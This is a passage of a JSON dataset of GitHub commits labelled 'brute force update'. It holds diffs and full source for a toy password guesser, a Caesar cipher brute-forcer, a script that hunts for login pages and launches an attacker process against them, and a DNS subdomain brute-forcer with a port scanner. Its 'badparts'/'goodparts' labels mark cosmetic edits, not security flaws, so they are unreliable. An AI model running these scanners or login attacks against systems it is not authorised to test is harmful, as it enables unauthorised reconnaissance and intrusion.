print(\"<============\"+str(guess_password) +\"============>\") if guess_password==list(password): \t print(\"Cracked Password: \" +\"\".join(guess_password)) \t keep_going=False ","sourceWithComments":"import random\nimport string\n\n#Courtesy of https:\/\/github.com\/MustafaTheCoder\n\ndef split(word):\n    return list(word)\n\nkeep_going = True\nguess_password = \"\"\nchars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!$%&'()*+,-.\/:;<=>?@[\\]^_`{|}~\"\n\npassword = input(\"Enter Password: \")\n\nwhile keep_going:\n    guess_password = random.choices(split(chars), k=len(password))\n    print(\"<============\"+ str(guess_password) +\"============>\")\n    \n    if guess_password == list(password):\n\t    print(\"Cracked Password: \" + \"\".join(guess_password))\n\t    keep_going = False\n"}},"msg":"Update Crack_Password_Brute_Force.py"},"23744f93a2daeff223f4a10da3fa18e999e9a468":{"url":"https:\/\/api.github.com\/repos\/newbietofx\/Python-Crack-Password\/commits\/23744f93a2daeff223f4a10da3fa18e999e9a468","html_url":"https:\/\/github.com\/newbietofx\/Python-Crack-Password\/commit\/23744f93a2daeff223f4a10da3fa18e999e9a468","sha":"23744f93a2daeff223f4a10da3fa18e999e9a468","keyword":"brute force update","diff":"diff --git a\/Crack_Password_Brute_Force.py b\/Crack_Password_Brute_Force.py\nindex ad79465..dce2123 100644\n--- a\/Crack_Password_Brute_Force.py\n+++ b\/Crack_Password_Brute_Force.py\n@@ -13,7 +13,7 @@ def split(word):\n \n password = input(\"Enter Password: \")\n # store starting time\n-begin = time.time()\n+start = time.perf_counter()\n   \n # program body starts\n while keep_going:\n@@ -24,7 +24,7 @@ def split(word):\n \t    print(\"Cracked Password: \" + \"\".join(guess_password))\n \t    time.sleep(1)\n \t    # store end time\n-\t    end = time.time()\n+\t    end = time.perf_counter()\n \t    # total time taken\n-\t    print(f\"Total runtime of the program is {end - begin} s\")\n+\t    print(f\"Total runtime of the program is {end - start} s\")\n \t    keep_going = False\n","message":"","files":{"\/Crack_Password_Brute_Force.py":{"changes":[{"diff":"\n \n password = input(\"Enter Password: \")\n # store starting time\n-begin = time.time()\n+start = time.perf_counter()\n   \n # program body starts\n while keep_going:\n","add":1,"remove":1,"filename":"\/Crack_Password_Brute_Force.py","badparts":["begin = time.time()"],"goodparts":["start = time.perf_counter()"]},{"diff":"\n \t    print(\"Cracked Password: \" + \"\".join(guess_password))\n \t    time.sleep(1)\n \t    # store end time\n-\t    end = time.time()\n+\t    end = time.perf_counter()\n \t    # total time taken\n-\t    print(f\"Total runtime of the program is {end - begin} s\")\n+\t    print(f\"Total runtime of the program is {end - start} s\")\n \t    keep_going = False\n","add":2,"remove":2,"filename":"\/Crack_Password_Brute_Force.py","badparts":["\t    end = time.time()","\t    print(f\"Total runtime of the program is {end - begin} s\")"],"goodparts":["\t    end = time.perf_counter()","\t    print(f\"Total runtime of the program is {end - start} s\")"]}],"source":"\nimport random import time def split(word): return list(word) keep_going=True guess_password=\"\" chars=\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!$%&'()*+,-.\/:;<=>?@[\\]^_`{|}~\" password=input(\"Enter Password: \") begin=time.time() while keep_going: guess_password=random.choices(split(chars), k=len(password)) print(\"<============\"+str(guess_password) +\"============>\") if guess_password==list(password): \t print(\"Cracked Password: \" +\"\".join(guess_password)) \t time.sleep(1) \t \t end=time.time() \t \t print(f\"Total runtime of the program is{end -begin} s\") \t keep_going=False ","sourceWithComments":"import random\nimport time\n\n#courtesy of https:\/\/github.com\/MustafaTheCoder\n\ndef split(word):\n    return list(word)\n\nkeep_going = True\nguess_password = \"\"\nchars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!$%&'()*+,-.\/:;<=>?@[\\]^_`{|}~\"\n\n\npassword = input(\"Enter Password: \")\n# store starting time\nbegin = time.time()\n  \n# program body starts\nwhile keep_going:\n    guess_password = random.choices(split(chars), k=len(password))\n    print(\"<============\"+ str(guess_password) +\"============>\")\n    \n    if guess_password == list(password):\n\t    print(\"Cracked Password: \" + \"\".join(guess_password))\n\t    time.sleep(1)\n\t    # store end time\n\t    end = time.time()\n\t    # total time taken\n\t    print(f\"Total runtime of the program is {end - begin} s\")\n\t    keep_going = False\n"}},"msg":"Update Crack_Password_Brute_Force.py"},"73438e47ffd80f14c3273ee78abe828681810d40":{"url":"https:\/\/api.github.com\/repos\/newbietofx\/Python-Crack-Password\/commits\/73438e47ffd80f14c3273ee78abe828681810d40","html_url":"https:\/\/github.com\/newbietofx\/Python-Crack-Password\/commit\/73438e47ffd80f14c3273ee78abe828681810d40","message":"Update Crack_Password_Brute_Force.py","sha":"73438e47ffd80f14c3273ee78abe828681810d40","keyword":"brute force update","diff":"diff --git a\/Crack_Password_Brute_Force.py b\/Crack_Password_Brute_Force.py\nindex dce2123..587a860 100644\n--- a\/Crack_Password_Brute_Force.py\n+++ b\/Crack_Password_Brute_Force.py\n@@ -1,5 +1,5 @@\n import random\n-import time\n+from timeit import default_timer as timer\n \n #courtesy of https:\/\/github.com\/MustafaTheCoder\n \n@@ -13,7 +13,7 @@ def split(word):\n \n password = input(\"Enter Password: \")\n # store starting time\n-start = time.perf_counter()\n+start = timer()\n   \n # program body starts\n while keep_going:\n@@ -22,9 +22,6 @@ def split(word):\n     \n     if guess_password == list(password):\n \t    print(\"Cracked Password: \" + \"\".join(guess_password))\n-\t    time.sleep(1)\n-\t    # store end time\n-\t    end = time.perf_counter()\n \t    # total time taken\n-\t    print(f\"Total runtime of the program is {end - start} s\")\n+\t    print(f\"Total runtime of the program is {timer()-start} s\")\n \t    keep_going = False\n","files":{"\/Crack_Password_Brute_Force.py":{"changes":[{"diff":"\n import random\n-import time\n+from timeit import default_timer as timer\n \n #courtesy of https:\/\/github.com\/MustafaTheCoder\n \n","add":1,"remove":1,"filename":"\/Crack_Password_Brute_Force.py","badparts":["import time"],"goodparts":["from timeit import default_timer as timer"]},{"diff":"\n \n password = input(\"Enter Password: \")\n # store starting time\n-start = time.perf_counter()\n+start = timer()\n   \n # program body starts\n while keep_going:\n","add":1,"remove":1,"filename":"\/Crack_Password_Brute_Force.py","badparts":["start = time.perf_counter()"],"goodparts":["start = timer()"]},{"diff":"\n     \n     if guess_password == list(password):\n \t    print(\"Cracked Password: \" + \"\".join(guess_password))\n-\t    time.sleep(1)\n-\t    # store end time\n-\t    end = time.perf_counter()\n \t    # total time taken\n-\t    print(f\"Total runtime of the program is {end - start} s\")\n+\t    print(f\"Total runtime of the program is {timer()-start} s\")\n \t    keep_going = False\n","add":1,"remove":4,"filename":"\/Crack_Password_Brute_Force.py","badparts":["\t    time.sleep(1)","\t    end = time.perf_counter()","\t    print(f\"Total runtime of the program is {end - start} s\")"],"goodparts":["\t    print(f\"Total runtime of the program is {timer()-start} s\")"]}],"source":"\nimport random import time def split(word): return list(word) keep_going=True guess_password=\"\" chars=\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!$%&'()*+,-.\/:;<=>?@[\\]^_`{|}~\" password=input(\"Enter Password: \") start=time.perf_counter() while keep_going: guess_password=random.choices(split(chars), k=len(password)) print(\"<============\"+str(guess_password) +\"============>\") if guess_password==list(password): \t print(\"Cracked Password: \" +\"\".join(guess_password)) \t time.sleep(1) \t \t end=time.perf_counter() \t \t print(f\"Total runtime of the program is{end -start} s\") \t keep_going=False ","sourceWithComments":"import random\nimport time\n\n#courtesy of https:\/\/github.com\/MustafaTheCoder\n\ndef split(word):\n    return list(word)\n\nkeep_going = True\nguess_password = \"\"\nchars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!$%&'()*+,-.\/:;<=>?@[\\]^_`{|}~\"\n\n\npassword = input(\"Enter Password: \")\n# store starting time\nstart = time.perf_counter()\n  \n# program body starts\nwhile keep_going:\n    guess_password = random.choices(split(chars), k=len(password))\n    print(\"<============\"+ str(guess_password) +\"============>\")\n    \n    if guess_password == list(password):\n\t    print(\"Cracked Password: \" + \"\".join(guess_password))\n\t    time.sleep(1)\n\t    # store end time\n\t    end = time.perf_counter()\n\t    # total time taken\n\t    print(f\"Total runtime of the program is {end - start} s\")\n\t    keep_going = False\n"}},"msg":"Update Crack_Password_Brute_Force.py"}},"https:\/\/github.com\/sharon-raz9\/assigment":{"c9f555fd413678bb54345bc8bd79dfbdb2f885c4":{"url":"https:\/\/api.github.com\/repos\/sharon-raz9\/assigment\/commits\/c9f555fd413678bb54345bc8bd79dfbdb2f885c4","html_url":"https:\/\/github.com\/sharon-raz9\/assigment\/commit\/c9f555fd413678bb54345bc8bd79dfbdb2f885c4","message":"Update url_brute_force.py","sha":"c9f555fd413678bb54345bc8bd79dfbdb2f885c4","keyword":"brute force update","diff":"diff --git a\/url_brute_force.py b\/url_brute_force.py\nindex fd1d9dd..740b3d7 100644\n--- a\/url_brute_force.py\n+++ b\/url_brute_force.py\n@@ -55,7 +55,6 @@ def scan_for_login_pages(self, extension_list):\n                         p = multiprocessing.Process(\r\n                             target=attacker.Attacker(url).attack)\r\n                         p.start()\r\n-                        break\r\n             except requests.ConnectionError:\r\n                 pass\r\n \r\n","files":{"\/url_brute_force.py":{"changes":[{"diff":"\n                         p = multiprocessing.Process(\r\n                             target=attacker.Attacker(url).attack)\r\n                         p.start()\r\n-                        break\r\n             except requests.ConnectionError:\r\n                 pass\r\n \r\n","add":0,"remove":1,"filename":"\/url_brute_force.py","badparts":["                        break\r"],"goodparts":[]}],"source":"\nimport requests\r import multiprocessing\r \r import attacker\r \r LOGIN_WORDS=['password', 'login', 'authentication', 'fname']\r URL_BRUTE_FORCE_NAMES='url_brute_force_names.txt'\r \r \r class UrlBruteForce:\r def __init__(self, url):\r self.url=url\r \r def create_url(self, extension):\r full_url=f\"{self.url}{extension}\"\r return full_url\r \r def get_extensions_from_robots(self):\r res=requests.get(f\"{self.url}\/robots.txt\")\r robots_list=res.text\r robots_list=robots_list.replace('Disallow: ', '')\r robots_list=robots_list.replace('Allow: ', '')\r robots_list=robots_list.splitlines()\r robots_list=[url for url in robots_list if url.startswith('\/')]\r return robots_list\r \r def create_url_extension_list(self, extension_file_path):\r robots_extension_list=self.get_extensions_from_robots()\r with open(extension_file_path, 'r') as file:\r extension=file.read()\r extension_list=extension.splitlines()\r print(extension_list)\r return extension_list +robots_extension_list\r \r @staticmethod\r def check_if_login_page(page_text):\r w=[word for word in LOGIN_WORDS if word in page_text]\r if len(w) > 0:\r return True\r return False\r \r def scan_for_login_pages(self, extension_list):\r for extension in extension_list:\r url=self.create_url(extension)\r print(f'the current url is:{url}')\r try:\r res=requests.get(url)\r print(res.status_code)\r if res.status_code==200:\r result=UrlBruteForce.check_if_login_page(res.text)\r if result:\r print(f\"{url} is a login page\")\r p=multiprocessing.Process(\r target=attacker.Attacker(url).attack)\r p.start()\r break\r except requests.ConnectionError:\r pass\r \r def run(self):\r extension_list=self.create_url_extension_list(URL_BRUTE_FORCE_NAMES)\r self.scan_for_login_pages(extension_list)\r ","sourceWithComments":"import requests\r\nimport multiprocessing\r\n\r\nimport attacker\r\n\r\nLOGIN_WORDS = ['password', 'login', 'authentication', 'fname']\r\nURL_BRUTE_FORCE_NAMES = 'url_brute_force_names.txt'\r\n\r\n\r\nclass UrlBruteForce:\r\n    def __init__(self, url):\r\n        self.url = url\r\n\r\n    def create_url(self, extension):\r\n        full_url = f\"{self.url}{extension}\"\r\n        return full_url\r\n\r\n    # get more url options from robots.txt\r\n    def get_extensions_from_robots(self):\r\n        res = requests.get(f\"{self.url}\/robots.txt\")\r\n        robots_list = res.text\r\n        robots_list = robots_list.replace('Disallow: ', '')\r\n        robots_list = robots_list.replace('Allow: ', '')\r\n        robots_list = robots_list.splitlines()\r\n        robots_list = [url for url in robots_list if url.startswith('\/')]\r\n        return robots_list\r\n\r\n    def create_url_extension_list(self, extension_file_path):\r\n        robots_extension_list = self.get_extensions_from_robots()\r\n        # get more extensions from file\r\n        with open(extension_file_path, 'r') as file:\r\n            extension = file.read()\r\n            extension_list = extension.splitlines()\r\n            print(extension_list)\r\n        return extension_list + robots_extension_list\r\n\r\n    @staticmethod\r\n    def check_if_login_page(page_text):\r\n        w = [word for word in LOGIN_WORDS if word in page_text]\r\n        if len(w) > 0:\r\n            return True\r\n        return False\r\n\r\n    def scan_for_login_pages(self, extension_list):\r\n        for extension in extension_list:\r\n            url = self.create_url(extension)\r\n            print(f'the current url is : {url}')\r\n            try:\r\n                res = requests.get(url)\r\n                print(res.status_code)\r\n                if res.status_code == 200:\r\n                    result = UrlBruteForce.check_if_login_page(res.text)\r\n                    if result:\r\n                        print(f\"{url} is a login page\")\r\n                        p = multiprocessing.Process(\r\n                            target=attacker.Attacker(url).attack)\r\n                        p.start()\r\n                        break\r\n            except requests.ConnectionError:\r\n                pass\r\n\r\n    def run(self):\r\n        extension_list = self.create_url_extension_list(URL_BRUTE_FORCE_NAMES)\r\n        self.scan_for_login_pages(extension_list)\r\n"}},"msg":"Update url_brute_force.py"}},"https:\/\/github.com\/Jatin-Bhalla\/cr4ck1ng_c1ph3r5":{"3f17a564951bb12c6f5ebc289bd210e64402e54c":{"url":"https:\/\/api.github.com\/repos\/Jatin-Bhalla\/cr4ck1ng_c1ph3r5\/commits\/3f17a564951bb12c6f5ebc289bd210e64402e54c","html_url":"https:\/\/github.com\/Jatin-Bhalla\/cr4ck1ng_c1ph3r5\/commit\/3f17a564951bb12c6f5ebc289bd210e64402e54c","message":"Update Caesarbruteforce.py\n\ni will update to the brute force code with all possible outcomes","sha":"3f17a564951bb12c6f5ebc289bd210e64402e54c","keyword":"brute force update","diff":"diff --git a\/Caesarbruteforce.py b\/Caesarbruteforce.py\nindex 6ba576d..3aa2e70 100644\n--- a\/Caesarbruteforce.py\n+++ b\/Caesarbruteforce.py\n@@ -1,5 +1,6 @@\n # WE brute fore the caesar cipher with python script\n-\"\"\" This code ends up providing with every possiblility for the cipher for the english language as there are only 26 letters therefore only 25 possible crypts exist\"\"\"\n+#this code uses rotate to encrypt the plain text\n+\n import string\n import collections\n # this code pieces uses rotate for caesar cipher like literally rorate LOL\n@@ -13,8 +14,8 @@ def Caesar(input ,k):\n     return input.translate(str.maketrans(string.ascii_uppercase,upper)).translate(str.maketrans(string.ascii_lowercase,lower))\n plain =input(\"ENTER YOU PLAIN TEXT:\")\n k= int(input(\"Enter your key:\"))\n-for i in range(len(string.ascii_uppercase)):\n-    print( i,\"|\" , Caesar(plain,k))\n+print(  Caesar(plain,k))\n+\n     \n \"\"\"I have this another piece of code below I saw online using ord()\"\"\"\n #check for errors in this line :43\n","files":{"\/Caesarbruteforce.py":{"changes":[{"diff":"\n # WE brute fore the caesar cipher with python script\n-\"\"\" This code ends up providing with every possiblility for the cipher for the english language as there are only 26 letters therefore only 25 possible crypts exist\"\"\"\n+#this code uses rotate to encrypt the plain text\n+\n import string\n import collections\n # this code pieces uses rotate for caesar cipher like literally rorate LOL\n","add":2,"remove":1,"filename":"\/Caesarbruteforce.py","badparts":["\"\"\" This code ends up providing with every possiblility for the cipher for the english language as there are only 26 letters therefore only 25 possible crypts exist\"\"\""],"goodparts":[]},{"diff":"\n     return input.translate(str.maketrans(string.ascii_uppercase,upper)).translate(str.maketrans(string.ascii_lowercase,lower))\n plain =input(\"ENTER YOU PLAIN TEXT:\")\n k= int(input(\"Enter your key:\"))\n-for i in range(len(string.ascii_uppercase)):\n-    print( i,\"|\" , Caesar(plain,k))\n+print(  Caesar(plain,k))\n+\n     \n \"\"\"I have this another piece of code below I saw online using ord()\"\"\"\n #check for errors in this line :43\n","add":2,"remove":2,"filename":"\/Caesarbruteforce.py","badparts":["for i in range(len(string.ascii_uppercase)):","    print( i,\"|\" , Caesar(plain,k))"],"goodparts":["print(  Caesar(plain,k))"]}],"source":"\n \"\"\" This code ends up providing with every possiblility for the cipher for the english language as there are only 26 letters therefore only 25 possible crypts exist\"\"\" import string import collections def Caesar(input,k): upper=collections.deque(string.ascii_uppercase) lower=collections.deque(string.ascii_lowercase) upper.rotate(k) lower.rotate(k) upper=''.join(list(upper)) lower=''.join(list(lower)) return input.translate(str.maketrans(string.ascii_uppercase,upper)).translate(str.maketrans(string.ascii_lowercase,lower)) plain=input(\"ENTER YOU PLAIN TEXT:\") k=int(input(\"Enter your key:\")) for i in range(len(string.ascii_uppercase)): print( i,\"|\", Caesar(plain,k)) \"\"\"I have this another piece of code below I saw online using ord()\"\"\" \"\"\" import string whatto_do=input(\"Encrypt=1 \\t Bruteforce=0 \\t choose what you want to proceed with:\\n -->\") plain=input(\"Enter plain text:\\n\") if whatto_do==\"1\": k=int(input(\"Enter your key(0-26):\\t\")) def Caesar(input,k): output=\"\" input=input.lower() for x in input: if x in str.ascii_letters: temp=ord(x)+k if temp > ord(\"z\") temp=temp-26 output=output+chr(temp) else: output=output+x return output if whatto_do==\"1\": print(Caesar(plain,k)) else: for k in range(26): print(\"key=\"+str(k)) print(Caesar(plain,k)) \"\"\" ","sourceWithComments":"# WE brute fore the caesar cipher with python script\n\"\"\" This code ends up providing with every possiblility for the cipher for the english language as there are only 26 letters therefore only 25 possible crypts exist\"\"\"\nimport string\nimport collections\n# this code pieces uses rotate for caesar cipher like literally rorate LOL\ndef Caesar(input ,k):\n    upper=collections.deque(string.ascii_uppercase)\n    lower =collections.deque(string.ascii_lowercase)\n    upper.rotate(k)\n    lower.rotate(k)\n    upper ='' .join(list(upper))\n    lower ='' .join(list(lower))\n    return input.translate(str.maketrans(string.ascii_uppercase,upper)).translate(str.maketrans(string.ascii_lowercase,lower))\nplain =input(\"ENTER YOU PLAIN TEXT:\")\nk= int(input(\"Enter your key:\"))\nfor i in range(len(string.ascii_uppercase)):\n    print( i,\"|\" , Caesar(plain,k))\n    \n\"\"\"I have this another piece of code below I saw online using ord()\"\"\"\n#check for errors in this line :43\n\"\"\"\nimport string\n# first ask if you want to encrypt or decrypt\nwhatto_do =input(\"Encrypt=1 \\t Bruteforce=0 \\t choose what you want to proceed with :\\n -->\")\nplain=input(\"Enter plain text:\\n\")\n#now if ypu chose encrypt\nif whatto_do ==\"1\":\n    k=int(input(\"Enter your key(0-26):\\t\"))\n\n#now the basic stuff is done but we need to  define  a function  to solve the caesar cipher and we need to provide it with what all it does\ndef Caesar(input,k):\n    #k is a global variable whose value will be used\n    output=\"\"\n    input=input.lower()\n    #define a input and output cuz you will get a plain text and a encrypted text although there is already variabales for that so u define new local variables instead of the local variable\n    for x in input:\n        if x in str.ascii_letters:\n            temp = ord(x)+k\n            if temp > ord(\"z\")             # this line is showing syntax error!?\n            temp=temp-26\n            #this is done cuz if the letter exceeds z it goes back to a\n            output =output+chr(temp)\n        else:\n            output=output+x\n            return output\n#now that the cipher is complete\nif  whatto_do ==\"1\":\n    print(Caesar(plain,k))\nelse:\n    #this code is what will work for brute force\n    for  k in range(26):\n        print(\"key = \"+str(k))\n        print(Caesar(plain,k))\n\n\"\"\"\n"}},"msg":"Update Caesarbruteforce.py\n\ni will update to the brute force code with all possible outcomes"}},"https:\/\/github.com\/Mundoprogramador\/bruteforce-dns":{"2fc3afc9f72da645a5c033375f29d3b44e7f7299":{"url":"https:\/\/api.github.com\/repos\/Mundoprogramador\/bruteforce-dns\/commits\/2fc3afc9f72da645a5c033375f29d3b44e7f7299","html_url":"https:\/\/github.com\/Mundoprogramador\/bruteforce-dns\/commit\/2fc3afc9f72da645a5c033375f29d3b44e7f7299","message":"Update dns-brute-force.py","sha":"2fc3afc9f72da645a5c033375f29d3b44e7f7299","keyword":"brute force update","diff":"diff --git a\/dns-brute-force.py b\/dns-brute-force.py\nindex ddac88d..e1468a5 100644\n--- a\/dns-brute-force.py\n+++ b\/dns-brute-force.py\n@@ -12,7 +12,7 @@ def main(self):\n         print('\\n'\n               '        \u2588\u2588\u2588\u2588\u2580\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2580\u2588\u2588\u2588\u2588 \\n'\n               '        \u2588\u2588\u2588\u2502\u2591\u2591==========================\u2591\u2591\u2502\u2588\u2588\u2588 \\n'\n-              '        \u2588\u2588\u258c\u2502\u2591\u2591  MUNDOPROGRAMADOR          \u2591\u2591\u2502\u2588\u2588\u2588 \\n'\n+              '        \u2588\u2588\u258c\u2502\u2591\u2591      MUNDOPROGRAMADOR    \u2591\u2591\u2502\u2588\u2588\u2588 \\n'\n               '        \u2588\u2588\u2591\u2514\u2510\u2591==========================\u2591\u250c\u2518\u2591\u2588\u2588 \\n'\n               '        \u2588\u2588\u2591\u2591\u2514\u2510\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u250c\u2518\u2591\u2591\u2588\u2588 \\n'\n               '        \u2588\u2588\u2591\u2591\u250c\u2518\u2584\u2584\u2584\u2584\u2584\u2591\u2591\u2591\u2591\u2591\u2584\u2584\u2584\u2584\u2584\u2514\u2510\u2591\u2591\u2588\u2588 \\n'\n","files":{"\/dns-brute-force.py":{"changes":[{"diff":"\n         print('\\n'\n               '        \u2588\u2588\u2588\u2588\u2580\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2580\u2588\u2588\u2588\u2588 \\n'\n               '        \u2588\u2588\u2588\u2502\u2591\u2591==========================\u2591\u2591\u2502\u2588\u2588\u2588 \\n'\n-              '        \u2588\u2588\u258c\u2502\u2591\u2591  MUNDOPROGRAMADOR          \u2591\u2591\u2502\u2588\u2588\u2588 \\n'\n+              '        \u2588\u2588\u258c\u2502\u2591\u2591      MUNDOPROGRAMADOR    \u2591\u2591\u2502\u2588\u2588\u2588 \\n'\n               '        \u2588\u2588\u2591\u2514\u2510\u2591==========================\u2591\u250c\u2518\u2591\u2588\u2588 \\n'\n               '        \u2588\u2588\u2591\u2591\u2514\u2510\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u250c\u2518\u2591\u2591\u2588\u2588 \\n'\n               '        \u2588\u2588\u2591\u2591\u250c\u2518\u2584\u2584\u2584\u2584\u2584\u2591\u2591\u2591\u2591\u2591\u2584\u2584\u2584\u2584\u2584\u2514\u2510\u2591\u2591\u2588\u2588 \\n'\n","add":1,"remove":1,"filename":"\/dns-brute-force.py","badparts":["              '        \u2588\u2588\u258c\u2502\u2591\u2591  MUNDOPROGRAMADOR          \u2591\u2591\u2502\u2588\u2588\u2588 \\n'"],"goodparts":["              '        \u2588\u2588\u258c\u2502\u2591\u2591      MUNDOPROGRAMADOR    \u2591\u2591\u2502\u2588\u2588\u2588 \\n'"]}],"source":"\nimport socket,os,sys class Methods(object): def __init__(self): self.filelocation=None self.file=None self.__subdomains=[\"ns1\", \"ns2\", \"ww2\", \"www\", \"admin\", \"intranet\", \"ftp\"] self.subdomainwordlistfile=None self.host=None self.method=None self.__ports=[80,8080,443,21,25,135,23,11,111,67,13,7,19,17,53] def main(self): print('\\n' ' \u2588\u2588\u2588\u2588\u2580\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2580\u2588\u2588\u2588\u2588 \\n' ' \u2588\u2588\u2588\u2502\u2591\u2591==========================\u2591\u2591\u2502\u2588\u2588\u2588 \\n' ' \u2588\u2588\u258c\u2502\u2591\u2591 MUNDOPROGRAMADOR \u2591\u2591\u2502\u2588\u2588\u2588 \\n' ' \u2588\u2588\u2591\u2514\u2510\u2591==========================\u2591\u250c\u2518\u2591\u2588\u2588 \\n' ' \u2588\u2588\u2591\u2591\u2514\u2510\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u250c\u2518\u2591\u2591\u2588\u2588 \\n' ' \u2588\u2588\u2591\u2591\u250c\u2518\u2584\u2584\u2584\u2584\u2584\u2591\u2591\u2591\u2591\u2591\u2584\u2584\u2584\u2584\u2584\u2514\u2510\u2591\u2591\u2588\u2588 \\n' ' \u2588\u2588\u258c\u2591\u2502\u2588\u2588\u2588\u2588\u2588\u2588\u258c\u2591\u2591\u2591\u2590\u2588\u2588\u2588\u2588\u2588\u2588\u2502\u2591\u2590\u2588\u2588 \\n' ' \u2588\u2588\u2588\u2591\u2502\u2590\u2588\u2588\u2588\u2580\u2580\u2591\u2591\u2584\u2591\u2591\u2580\u2580\u2588\u2588\u2588\u258c\u2502\u2591\u2588\u2588\u2588 \\n' ' \u2588\u2588\u2580\u2500\u2518\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2590\u2588\u258c\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2514\u2500\u2580\u2588\u2588 \\n' ' \u2588\u2588\u2584\u2591\u2591\u2591\u2584\u2584\u2584\u2593\u2591\u2591\u2580\u2588\u2580\u2591\u2591\u2593\u2584\u2584\u2584\u2591\u2591\u2591\u2584\u2588\u2588\\n' ' \u2588\u2588\u2588\u2588\u2584\u2500\u2518\u2588\u2588\u258c\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2590\u2588\u2588\u2514\u2500\u2584\u2588\u2588\u2588\u2588\\n' ' \u2588\u2588\u2588\u2588\u2588\u2591\u2591\u2590\u2588\u2500\u252c\u252c\u252c\u252c\u252c\u252c\u252c\u2500\u2588\u258c\u2591\u2591\u2588\u2588\u2588\u2588\u2588\\n' ' \u2588\u2588\u2588\u2588\u258c\u2591\u2591\u2591\u2580\u252c\u253c\u253c\u253c\u253c\u253c\u253c\u253c\u252c\u2580\u2591\u2591\u2591\u2590\u2588\u2588\u2588\u2588 \\n' ' \u2588\u2588\u2588\u2588\u2588\u2584\u2591\u2591\u2591\u2514\u2534\u2534\u2534\u2534\u2534\u2534\u2534\u2518\u2591\u2591\u2591\u2584\u2588\u2588\u2588\u2588\u2588 \\n' ' \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2584\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\\n') self.method=input(\"Choose the mode:\\n\" \"[1] Default list\\n\" \"[2] Brute-Force with file.txt\\n\" \"[3] Port Scanner\\n\" \">> \") while self.method not in[\"1\",\"2\",\"3\"]: print(\"[!] Method not found!\") self.method=input(\"\\nChoose the mode:\\n\" \"[1] Default list\\n\" \"[2] Brute-Force with file.txt\\n\" \"[3] Port Scanner\\n\" \">> \") if self.method==\"1\": self.host_function() self.dns_default_bruteforce() elif self.method==\"2\": self.file_function() self.host_function() self.dns_bruteforce_wordlist() elif self.method==\"3\": self.port_scanner() elif self.method==\"4\": sys.exit() def file_function(self): self.filelocation=input(\"File name: \") while self.filelocation[-4:] !='.txt' or os.path.exists(self.filelocation) !=True: print(\"[!] Invalid file name: \") self.filelocation=input(\"File name: \") def host_function(self): self.host=input(\"Host: \") try: if self.host.replace('.', '').isdigit(): self.host=socket.gethostbyaddr(self.host) else: if \"www.\" in self.host: self.host=self.host[4:] pass if \".com\" not in self.host: self.host=self.host +\".com\" pass print(f\"Host Ip:{socket.gethostbyname(self.host)}\") except socket.herror: print(\"[!] HOST NOT FOUND \") sys.exit() except socket.gaierror: print(\"[!] HOST NOT FOUND OR CORRUPTED HOST\") sys.exit() def dns_default_bruteforce(self): for subdomain in self._Methods__subdomains: dns=subdomain +\".\" +self.host try: print(f\"{dns}:{socket.gethostbyname(dns)}\") except socket.herror: pass except socket.gaierror: pass def dns_bruteforce_wordlist(self): try: self.subdomainwordlistfile=open(self.filelocation, 'r') self.subdomainwordlist=self.subdomainwordlistfile.read().strip().split() for item in self.subdomainwordlist: dns=item +\".\" +self.host try: print(f'{dns}:{socket.gethostbyname(dns)}') except socket.herror: pass except socket.gaierror: pass except FileNotFoundError: print(\"[!] FILE NOT FOUND[!]\") def port_scanner(self): self.host=input(\"Host: \") if \"www.\" in self.host: self.host=self.host[4:] pass for port in self._Methods__ports: client=socket.socket(socket.AF_INET, socket.SOCK_STREAM) code=client.connect_ex((self.host,port)) if code==0: try: print(f\"{port} OPEN\") except socket.gaierror: pass dnsbruteforce=Methods() dnsbruteforce.main() ","sourceWithComments":"import socket,os,sys\nclass Methods(object):\n    def __init__(self):\n        self.filelocation = None\n        self.file = None\n        self.__subdomains = [\"ns1\", \"ns2\", \"ww2\", \"www\", \"admin\", \"intranet\", \"ftp\"]\n        self.subdomainwordlistfile = None\n        self.host = None\n        self.method = None\n        self.__ports = [80,8080,443,21,25,135,23,11,111,67,13,7,19,17,53]\n    def main(self):\n        print('\\n'\n              '        \u2588\u2588\u2588\u2588\u2580\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2580\u2588\u2588\u2588\u2588 \\n'\n              '        \u2588\u2588\u2588\u2502\u2591\u2591==========================\u2591\u2591\u2502\u2588\u2588\u2588 \\n'\n              '        \u2588\u2588\u258c\u2502\u2591\u2591  MUNDOPROGRAMADOR          \u2591\u2591\u2502\u2588\u2588\u2588 \\n'\n              '        \u2588\u2588\u2591\u2514\u2510\u2591==========================\u2591\u250c\u2518\u2591\u2588\u2588 \\n'\n              '        \u2588\u2588\u2591\u2591\u2514\u2510\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u250c\u2518\u2591\u2591\u2588\u2588 \\n'\n              '        